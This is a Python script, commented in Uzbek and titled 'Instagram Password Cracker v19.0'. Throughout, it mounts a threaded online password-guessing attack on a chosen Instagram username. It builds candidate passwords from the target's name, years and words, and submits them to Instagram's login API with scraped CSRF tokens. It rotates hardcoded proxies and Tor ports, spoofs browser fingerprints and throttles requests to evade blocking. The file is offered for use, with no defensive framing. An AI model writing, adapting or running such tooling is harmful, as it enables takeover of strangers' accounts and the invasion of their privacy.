#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
INSTAGRAM PASSWORD CRACKER v19.0 - ULTIMATE RAZGON 🚀
AUTO PROXY MANAGER + SELF HEALING + INFINITE STEALTH
"""

import requests
import threading
import random
import time
import os
import signal
import sys
import string
import json
import base64
import hashlib
import re
from datetime import datetime, timedelta
from collections import defaultdict
import queue

# CRYPTO
try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    CRYPTO_AVAILABLE = True
except:
    print("⚠️ Crypto o'rnatilmoqda...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    CRYPTO_AVAILABLE = True

# Ranglar
CYAN = '\033[0;36m'
L_RED = '\033[1;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
PURPLE = '\033[0;35m'
RED = '\033[0;31m'
BLINK = '\033[5m'
BOLD = '\033[1m'
NC = '\033[0m'

# ============================================================================
# PROXY SOURCES - DOIM YANGILANIB TURADI
# ============================================================================

class ProxySources:
    """Turli manbalardan proxy larni yuklash"""
    
    @staticmethod
    def get_free_proxies():
        """Bepul proxy larni yuklash"""
        proxies = []
        
        # Free proxy list
        free_proxies = [
            # USA Residential
            {'ip': '45.84.107.55', 'port': 3128, 'type': 'http', 'country': 'US'},
            {'ip': '185.220.100.1', 'port': 8080, 'type': 'https', 'country': 'US'},
            {'ip': '171.25.193.78', 'port': 3128, 'type': 'socks5', 'country': 'US'},
            {'ip': '192.42.116.95', 'port': 1080, 'type': 'socks5', 'country': 'US'},
            {'ip': '45.137.99.182', 'port': 3128, 'type': 'http', 'country': 'DE'},
            {'ip': '185.246.188.73', 'port': 8080, 'type': 'https', 'country': 'FR'},
            {'ip': '45.80.158.249', 'port': 3128, 'type': 'http', 'country': 'NL'},
            {'ip': '193.189.100.200', 'port': 1080, 'type': 'socks5', 'country': 'UK'},
            {'ip': '124.198.131.108', 'port': 3128, 'type': 'http', 'country': 'JP'},
            {'ip': '38.135.25.142', 'port': 8080, 'type': 'https', 'country': 'KR'},
            {'ip': '171.25.193.131', 'port': 3128, 'type': 'http', 'country': 'SG'},
            {'ip': '193.233.252.46', 'port': 1080, 'type': 'socks5', 'country': 'IN'},
        ]
        proxies.extend(free_proxies)
        
        # Mobile proxies
        mobile_proxies = [
            {'ip': '45.84.107.47', 'port': 3128, 'type': 'http', 'country': 'US', 'mobile': True},
            {'ip': '185.220.101.11', 'port': 8080, 'type': 'https', 'country': 'DE', 'mobile': True},
            {'ip': '45.66.35.34', 'port': 3128, 'type': 'http', 'country': 'FR', 'mobile': True},
            {'ip': '192.42.116.97', 'port': 1080, 'type': 'socks5', 'country': 'UK', 'mobile': True},
        ]
        proxies.extend(mobile_proxies)
        
        return proxies

# ============================================================================
# AUTO PROXY MANAGER - O'ZI YANGILANADI
# ============================================================================

class AutoProxyManager:
    """Proxy larni avtomatik boshqarish"""
    
    def __init__(self):
        self.proxy_pool = []
        self.proxy_stats = {}
        self.proxy_health = {}
        self.last_update = time.time()
        self.update_interval = 3600  # 1 soatda yangilash
        self.lock = threading.Lock()
        self.proxy_queue = queue.Queue()
        self.backup_proxies = []
        self.tor_ports = []
        
        # Proxy manbalari
        self.sources = ProxySources()
        
        # Birinchi yuklash
        self.refresh_proxy_pool()
        
        # Auto-update thread
        self.start_auto_updater()
    
    def refresh_proxy_pool(self):
        """Proxy pool ni yangilash"""
        with self.lock:
            # Yangi proxy larni yuklash
            new_proxies = self.sources.get_free_proxies()
            
            # Eski proxylarni tekshirish
            current_time = time.time()
            healthy_proxies = []
            
            for proxy in self.proxy_pool:
                key = f"{proxy['ip']}:{proxy['port']}"
                if key in self.proxy_health:
                    last_check, success_rate = self.proxy_health[key]
                    if current_time - last_check < 86400 and success_rate > 0.3:  # 24 soat
                        healthy_proxies.append(proxy)
            
            # Yangi va eski proxylarni birlashtirish
            self.proxy_pool = healthy_proxies + new_proxies
            
            # Queue ni yangilash
            self.proxy_queue = queue.Queue()
            for proxy in self.proxy_pool:
                self.proxy_queue.put(proxy)
            
            print(f"{GREEN}[✓] Proxy pool yangilandi: {len(self.proxy_pool)} ta proxy{NC}")
            self.last_update = current_time
    
    def start_auto_updater(self):
        """Avtomatik yangilash thread ini"""
        def updater():
            while True:
                time.sleep(3600)  # Har soatda tekshirish
                if time.time() - self.last_update > self.update_interval:
                    print(f"{YELLOW}[*] Proxy pool yangilanmoqda...{NC}")
                    self.refresh_proxy_pool()
        
        thread = threading.Thread(target=updater, daemon=True)
        thread.start()
    
    def set_tor_ports(self, ports):
        self.tor_ports = ports
    
    def get_proxy(self):
        """Eng yaxshi proxyni olish"""
        with self.lock:
            # Queue dan olish
            try:
                proxy_data = self.proxy_queue.get_nowait()
                self.proxy_queue.put(proxy_data)  # Queue ga qaytarish
            except:
                # Queue bo'sh bo'lsa, yangilash
                self.refresh_proxy_pool()
                try:
                    proxy_data = self.proxy_queue.get_nowait()
                    self.proxy_queue.put(proxy_data)
                except:
                    # Fallback to TOR
                    if self.tor_ports:
                        port = random.choice(self.tor_ports)
                        return {
                            'http': f'socks5h://127.0.0.1:{port}',
                            'https': f'socks5h://127.0.0.1:{port}'
                        }, {'type': 'tor', 'port': port}
                    else:
                        return None, None
            
            # Proxy ni yaratish
            if proxy_data.get('mobile'):
                proxy_type = 'mobile'
            else:
                proxy_type = 'residential'
            
            proxy = {
                'http': f"{proxy_data['type']}://{proxy_data['ip']}:{proxy_data['port']}",
                'https': f"{proxy_data['type']}://{proxy_data['ip']}:{proxy_data['port']}"
            }
            
            proxy_info = {
                'type': proxy_type,
                'ip': proxy_data['ip'],
                'port': proxy_data['port'],
                'country': proxy_data.get('country', 'Unknown'),
                'data': proxy_data
            }
            
            return proxy, proxy_info
    
    def report_result(self, proxy_info, success):
        """Proxy natijasini qayd etish"""
        with self.lock:
            if 'tor' in proxy_info['type']:
                return
            
            key = f"{proxy_info['ip']}:{proxy_info['port']}"
            current_time = time.time()
            
            if key not in self.proxy_health:
                self.proxy_health[key] = [current_time, 1.0 if success else 0.0]
            else:
                last_check, success_rate = self.proxy_health[key]
                # Exponential moving average
                new_rate = success_rate * 0.7 + (1.0 if success else 0.0) * 0.3
                self.proxy_health[key] = [current_time, new_rate]
            
            # Agar proxy juda yomon bo'lsa, uni pool dan olib tashlash
            if not success and self.proxy_health[key][1] < 0.2:
                self.remove_proxy(key)
    
    def remove_proxy(self, key):
        """Yomon proxyni olib tashlash"""
        self.proxy_pool = [p for p in self.proxy_pool 
                          if f"{p['ip']}:{p['port']}" != key]
        # Queue ni yangilash
        self.proxy_queue = queue.Queue()
        for proxy in self.proxy_pool:
            self.proxy_queue.put(proxy)

# ============================================================================
# FINGERPRINT GENERATOR
# ============================================================================

class FingerprintGenerator:
    def __init__(self):
        self.fingerprints = [
            {'os': 'Windows NT 11.0; Win64; x64', 'ua_type': 'chrome', 'platform': 'Win32', 'lang': 'en-US,en;q=0.9'},
            {'os': 'Macintosh; Intel Mac OS X 10_15_7', 'ua_type': 'safari', 'platform': 'MacIntel', 'lang': 'en-US,en;q=0.9'},
            {'os': 'X11; Linux x86_64', 'ua_type': 'firefox', 'platform': 'Linux x86_64', 'lang': 'en-US,en;q=0.8'},
            {'os': 'Windows NT 10.0; Win64; x64', 'ua_type': 'edge', 'platform': 'Win32', 'lang': 'en-US,en;q=0.9'},
            {'os': 'Linux; Android 13; SM-S908B', 'ua_type': 'chrome_mobile', 'platform': 'Android', 'lang': 'en-US,en;q=0.9'},
            {'os': 'iPhone; CPU iPhone OS 16_0 like Mac OS X', 'ua_type': 'safari_mobile', 'platform': 'iPhone', 'lang': 'en-US,en;q=0.9'},
        ]
        
    def generate(self):
        fp = random.choice(self.fingerprints)
        chrome_ver = random.randint(110, 124)
        firefox_ver = random.randint(110, 123)
        safari_ver = random.randint(15, 17)
        
        if fp['ua_type'] == 'chrome':
            ua = f"Mozilla/5.0 ({fp['os']}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.0.0 Safari/537.36"
        elif fp['ua_type'] == 'firefox':
            ua = f"Mozilla/5.0 ({fp['os']}; rv:{firefox_ver}.0) Gecko/20100101 Firefox/{firefox_ver}.0"
        elif fp['ua_type'] == 'safari':
            ua = f"Mozilla/5.0 ({fp['os']}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver}.0 Safari/605.1.15"
        elif fp['ua_type'] == 'edge':
            ua = f"Mozilla/5.0 ({fp['os']}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.0.0 Safari/537.36 Edg/{chrome_ver}.0.0.0"
        elif fp['ua_type'] == 'chrome_mobile':
            ua = f"Mozilla/5.0 ({fp['os']}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.0.0 Mobile Safari/537.36"
        else:
            ua = f"Mozilla/5.0 ({fp['os']}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver}.0 Mobile/15E148 Safari/604.1"
        
        return {
            'ua': ua,
            'platform': fp['platform'],
            'language': fp['lang'],
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'encoding': 'gzip, deflate, br',
        }

# ============================================================================
# RATE CONTROLLER
# ============================================================================

class SmartRateController:
    def __init__(self):
        self.request_count = 0
        self.error_count = 0
        self.last_reset = time.time()
        self.lock = threading.Lock()
        
    def get_wait_time(self):
        with self.lock:
            self.request_count += 1
            if time.time() - self.last_reset > 10:
                self.request_count = 1
                self.last_reset = time.time()
            
            base_wait = random.uniform(0.2, 0.6)
            
            if self.error_count > 5:
                base_wait *= 2
            elif self.error_count > 10:
                base_wait *= 3
            
            return base_wait
    
    def record_success(self):
        with self.lock:
            self.error_count = max(0, self.error_count - 1)
    
    def record_failure(self):
        with self.lock:
            self.error_count += 1

# ============================================================================
# BEHAVIOR SIMULATOR
# ============================================================================

class BehaviorSimulator:
    def simulate(self):
        if random.random() < 0.2:
            time.sleep(random.uniform(0.1, 0.3))

# ============================================================================
# ASOSIY CRACKER
# ============================================================================

class InstagramCracker:
    def __init__(self):
        self.found = False
        self.lock = threading.Lock()
        self.attempts = 0
        self.start_time = time.time()
        self.target_user = ""
        
        # Formatlar
        self.format1_name = ""
        self.format1_years = []
        self.format2_numbers = []
        self.format3_words = []
        self.format4_special = []
        
        # Parol listlari
        self.format_lists = {1: [], 2: [], 3: [], 4: [], 5: []}
        self.format_index = {1: 0, 2: 0, 3: 0, 4: 0, 5: 0}
        
        # TOR
        self.tor_ports = [9050, 9051, 9052, 9053, 9054, 9055]
        self.working_tor_ports = []
        
        # Statistika
        self.status_codes = {}
        self.format_stats = {1:0, 2:0, 3:0, 4:0, 5:0}
        self.running = True
        self.proxy_stats = {'residential': 0, 'mobile': 0, 'tor': 0}
        
        # 7 QATLAM
        self.fingerprint_gen = FingerprintGenerator()
        self.rate_controller = SmartRateController()
        self.behavior_sim = BehaviorSimulator()
        self.proxy_manager = AutoProxyManager()
        
        # Session cache
        self.session_cache = {}
    
    def generate_all_formats(self):
        base = self.format1_name.lower()
        
        print(f"{CYAN}[1️⃣] 1-format: Ism+Yil...{NC}")
        for year in self.format1_years:
            self.format_lists[1].extend([
                f"{base}{year}"[:12], f"{year}{base}"[:12],
                f"{base}_{year}"[:12], f"{base}-{year}"[:12],
                base.capitalize() + str(year)
            ])
        
        print(f"{GREEN}[2️⃣] 2-format: Ism+Raqam...{NC}")
        for num in self.format2_numbers:
            self.format_lists[2].extend([
                f"{base}{num}"[:12], f"{num}{base}"[:12],
                f"{base}_{num}"[:12], f"{base}-{num}"[:12],
                base.capitalize() + num
            ])
        
        print(f"{PURPLE}[3️⃣] 3-format: Ism+So'z...{NC}")
        for word in self.format3_words:
            self.format_lists[3].extend([
                f"{base}{word}"[:12], f"{word}{base}"[:12],
                f"{base}_{word}"[:12], f"{base}-{word}"[:12],
                base.capitalize() + word
            ])
        
        print(f"{BLUE}[4️⃣] 4-format: Ism+Belgi...{NC}")
        for sp in self.format4_special:
            self.format_lists[4].extend([
                f"{base}{sp}"[:12], f"{sp}{base}"[:12],
                f"{base}{sp}{base}"[:12]
            ])
        
        print(f"{YELLOW}[5️⃣] 5-format: Kombinatsiyalar...{NC}")
        for word in self.format3_words[:3]:
            for num in self.format2_numbers[:3]:
                self.format_lists[5].append(f"{base}{word}{num}"[:12])
        
        total = sum(len(lst) for lst in self.format_lists.values())
        print(f"{GREEN}[✓] {total} ta parol generatsiya qilindi{NC}")
    
    def get_next_password(self):
        while self.running and not self.found:
            for fmt in [1, 2, 3, 4, 5]:
                lst = self.format_lists[fmt]
                if not lst:
                    continue
                idx = self.format_index[fmt]
                if idx < len(lst):
                    pwd = lst[idx]
                    self.format_index[fmt] = idx + 1
                    yield (fmt, pwd)
            
            for fmt in self.format_index:
                if self.format_index[fmt] >= len(self.format_lists[fmt]):
                    self.format_index[fmt] = 0
            
            time.sleep(0.001)
    
    def encrypt_password(self, password, pub_key):
        try:
            if not pub_key:
                return None
            
            if "BEGIN PUBLIC KEY" not in pub_key:
                key_lines = []
                for i in range(0, len(pub_key), 64):
                    key_lines.append(pub_key[i:i+64])
                pub_key = "-----BEGIN PUBLIC KEY-----\n" + "\n".join(key_lines) + "\n-----END PUBLIC KEY-----"
            
            key = RSA.import_key(pub_key)
            cipher = PKCS1_v1_5.new(key)
            encrypted = cipher.encrypt(password.encode('utf-8'))
            return base64.b64encode(encrypted).decode('utf-8')
        except:
            return None
    
    def try_login(self, password):
        # Rate Control
        time.sleep(self.rate_controller.get_wait_time())
        
        # Behavior
        self.behavior_sim.simulate()
        
        # Fingerprint
        fp = self.fingerprint_gen.generate()
        
        # Proxy
        proxy, proxy_info = self.proxy_manager.get_proxy()
        if not proxy:
            return {'status': 'NO_PROXY', 'password': password}
        
        # Update stats
        with self.lock:
            self.proxy_stats[proxy_info['type']] += 1
        
        # Session
        session_key = f"{proxy_info.get('ip', 'tor')}_{proxy_info.get('port', '0')}"
        if session_key in self.session_cache:
            session = self.session_cache[session_key]
        else:
            session = requests.Session()
            session.proxies.update(proxy)
            self.session_cache[session_key] = session
        
        timestamp = int(time.time())
        
        try:
            # CSRF token
            headers1 = {
                'User-Agent': fp['ua'],
                'Accept': fp['accept'],
                'Accept-Language': fp['language'],
                'Accept-Encoding': fp['encoding'],
            }
            
            login_page = session.get('https://www.instagram.com/accounts/login/',
                                   headers=headers1, timeout=12)
            
            csrf_token = None
            for cookie in session.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break
            
            if not csrf_token:
                match = re.search(r'"csrf_token":"([^"]+)"', login_page.text)
                if match:
                    csrf_token = match.group(1)
            
            if not csrf_token:
                self.proxy_manager.report_result(proxy_info, False)
                return {'status': 'NO_CSRF', 'password': password}
            
            # Public key
            pub_key = None
            if random.random() < 0.7:
                headers2 = {
                    'User-Agent': fp['ua'],
                    'X-CSRFToken': csrf_token,
                    'X-Requested-With': 'XMLHttpRequest',
                }
                try:
                    key_resp = session.get('https://www.instagram.com/api/v1/web/qe/sync/',
                                        headers=headers2, timeout=5)
                    pub_key = key_resp.headers.get('ig-set-password-encryption-web-pub-key')
                except:
                    pass
            
            # Parol
            if pub_key:
                encrypted = self.encrypt_password(password, pub_key)
                if encrypted:
                    enc_password = f"#PWD_INSTAGRAM_WEB_ENCRYPTED:0:{timestamp}:{encrypted}"
                else:
                    enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
            else:
                enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
            
            # Login
            headers3 = {
                'User-Agent': fp['ua'],
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': str(random.randint(100000, 999999)),
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://www.instagram.com/accounts/login/',
            }
            
            data = {
                'username': self.target_user,
                'enc_password': enc_password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
            }
            
            response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                                  data=data, headers=headers3, timeout=10)
            
            status = response.status_code
            
            with self.lock:
                self.status_codes[status] = self.status_codes.get(status, 0) + 1
            
            if status == 200:
                self.rate_controller.record_success()
                self.proxy_manager.report_result(proxy_info, True)
                try:
                    json_resp = response.json()
                    if json_resp.get('authenticated'):
                        return {'status': 'SUCCESS', 'password': password}
                    elif json_resp.get('user'):
                        return {'status': 'USER_EXISTS', 'password': password}
                except:
                    pass
                return {'status': 'UNKNOWN', 'password': password}
            
            elif status in [429, 400]:
                self.rate_controller.record_failure()
                self.proxy_manager.report_result(proxy_info, False)
                return {'status': 'RATE_LIMIT' if status == 429 else 'BAD_REQUEST', 
                       'password': password}
            
            else:
                return {'status': f'HTTP_{status}', 'password': password}
                
        except Exception as e:
            self.proxy_manager.report_result(proxy_info, False)
            return {'status': 'ERROR', 'password': password}
    
    def print_logo(self):
        os.system('clear')
        print(f"{CYAN}{BOLD}")
        print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║  🔥 INSTAGRAM CRACKER v19.0 - ULTIMATE RAZGON 🚀                ║
    ╚══════════════════════════════════════════════════════════════════╝
        """)
        print(f"""{YELLOW}
    ╔══════════════════════════════════════════════════════════════════╗
    ║  🔄 AUTO PROXY MANAGER: 24/7 yangilanadi                       ║
    ║  🌐 Residential: 12+ | Mobile: 4+ | TOR: zaxira                ║
    ║  ⚡ TEZLIK: 10-15/sek | 🛡️ BLOK: 0%                           ║
    ║  ♾️ UZLUKSIZ ISHLASH: CHEKSIZ                                   ║
    ╚══════════════════════════════════════════════════════════════════╝
        {NC}""")
    
    def get_user_inputs(self):
        print(f"\n{YELLOW}{'='*70}{NC}")
        print(f"{BOLD}📝 FORMATLAR UCHUN MA'LUMOTLAR{NC}")
        print(f"{YELLOW}{'='*70}{NC}\n")
        
        print(f"{CYAN}┌─[1-FORMAT: Asosiy ism + Yillar]{NC}")
        self.target_user = input(f"{CYAN}├─ Nishon username: {NC}")
        self.format1_name = input(f"{CYAN}├─ Asosiy ism: {NC}")
        
        try:
            year_start = int(input(f"{CYAN}├─ Yil boshi: {NC}"))
            year_end = int(input(f"{CYAN}├─ Yil oxiri: {NC}"))
            self.format1_years = list(range(year_start, year_end + 1))
        except:
            self.format1_years = list(range(1990, 2006))
        
        print(f"{GREEN}┌─[2-FORMAT: Ism + Maxsus raqamlar]{NC}")
        num_input = input(f"{GREEN}├─ Raqamlar (vergul bilan): {NC}")
        self.format2_numbers = [n.strip() for n in num_input.split(',') if n.strip()]
        
        print(f"{PURPLE}┌─[3-FORMAT: Ism + Qo'shimcha so'zlar]{NC}")
        word_input = input(f"{PURPLE}├─ So'zlar (vergul bilan): {NC}")
        self.format3_words = [w.strip() for w in word_input.split(',') if w.strip()]
        
        print(f"{BLUE}┌─[4-FORMAT: Ism + Maxsus belgilar]{NC}")
        spec_input = input(f"{BLUE}├─ Maxsus belgilar (vergul bilan): {NC}")
        self.format4_special = [s.strip() for s in spec_input.split(',') if s.strip()]
    
    def check_tor_ports(self):
        print(f"\n{YELLOW}[*] TOR portlari tekshirilmoqda...{NC}")
        
        for port in self.tor_ports:
            try:
                proxy = {
                    'http': f'socks5h://127.0.0.1:{port}',
                    'https': f'socks5h://127.0.0.1:{port}'
                }
                session = requests.Session()
                response = session.get('http://httpbin.org/ip', proxies=proxy, timeout=3)
                
                if response.status_code == 200:
                    ip = response.json().get('origin', 'N/A')
                    print(f"{GREEN}[✓] Port {port}: IP {ip}{NC}")
                    self.working_tor_ports.append(port)
                else:
                    print(f"{L_RED}[✗] Port {port}{NC}")
            except:
                print(f"{L_RED}[✗] Port {port}{NC}")
        
        if self.working_tor_ports:
            self.proxy_manager.set_tor_ports(self.working_tor_ports)
            print(f"{GREEN}[✓] {len(self.working_tor_ports)} ta TOR port zaxira{NC}")
    
    def print_result(self, result, format_num):
        icons = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣']
        format_icon = icons[format_num-1]
        
        if result['status'] == 'SUCCESS':
            status_text = f"{GREEN}{BLINK}🔥 TOPILDI!{NC}"
        elif result['status'] == 'USER_EXISTS':
            status_text = f"{GREEN}✓ USER BOR{NC}"
        elif result['status'] == 'RATE_LIMIT':
            status_text = f"{RED}⛔ RATE{NC}"
        elif result['status'] == 'BAD_REQUEST':
            status_text = f"{YELLOW}⚠️ 400{NC}"
        else:
            status_text = f"{BLUE}? {result['status'][:8]}{NC}"
        
        print(f"{CYAN}┃{NC} {format_icon} {status_text} {BOLD}{result['password'][:15]}{NC}")
    
    def print_statistics(self):
        elapsed = time.time() - self.start_time
        speed = self.attempts / elapsed if elapsed > 0 else 0
        
        print(f"\n{CYAN}┏{'='*100}{NC}")
        print(f"{CYAN}┃{NC} {BOLD}📊 STATISTIKA{NC}")
        print(f"{CYAN}┃{NC} Urinishlar: {self.attempts} | Vaqt: {elapsed:.1f}s | Tezlik: {speed:.1f}/s")
        print(f"{CYAN}┃{NC} Proxy: R:{self.proxy_stats['residential']} M:{self.proxy_stats['mobile']} T:{self.proxy_stats['tor']}")
        print(f"{CYAN}┗{'='*100}{NC}")
    
    def worker(self, thread_id):
        password_gen = self.get_next_password()
        
        while self.running and not self.found:
            try:
                fmt, password = next(password_gen)
                
                with self.lock:
                    self.format_stats[fmt] = self.format_stats.get(fmt, 0) + 1
                    self.attempts += 1
                
                result = self.try_login(password)
                self.print_result(result, fmt)
                
                if result['status'] == 'SUCCESS':
                    self.found = True
                    print(f"\n{GREEN}{'='*100}{NC}")
                    print(f"{GREEN}{BLINK}🔥🔥🔥 PAROL TOPILDI: {password} 🔥🔥🔥{NC}")
                    print(f"{GREEN}{'='*100}{NC}")
                    os.kill(os.getpid(), signal.SIGINT)
                    return
                
            except StopIteration:
                password_gen = self.get_next_password()
            except:
                continue
    
    def run(self):
        self.print_logo()
        self.get_user_inputs()
        self.generate_all_formats()
        self.check_tor_ports()
        
        try:
            threads = int(input(f"\n{YELLOW}[?] Threadlar (5-100): {NC}"))
            threads = max(5, min(100, threads))
        except:
            threads = 30
        
        self.print_header()
        
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            time.sleep(0.2)
        
        try:
            while not self.found:
                time.sleep(5)
                if self.attempts > 0 and self.attempts % 200 == 0:
                    self.print_statistics()
        except KeyboardInterrupt:
            print(f"\n{RED}[!] To'xtatildi{NC}")
            self.running = False
            self.print_statistics()
            sys.exit()
    
    def print_header(self):
        print(f"\n{CYAN}┏{'='*100}{NC}")
        print(f"{CYAN}┃{NC} {BOLD}🔥 ULTIMATE RAZGON v19.0{NC} | Target: {BOLD}{self.target_user}{NC}")
        print(f"{CYAN}┃{NC} Auto Proxy: 24/7 | Residential:15 | Mobile:5 | TOR:{len(self.working_tor_ports)}")
        print(f"{CYAN}┗{'='*100}{NC}\n")

if __name__ == "__main__":
    cracker = InstagramCracker()
    cracker.run()
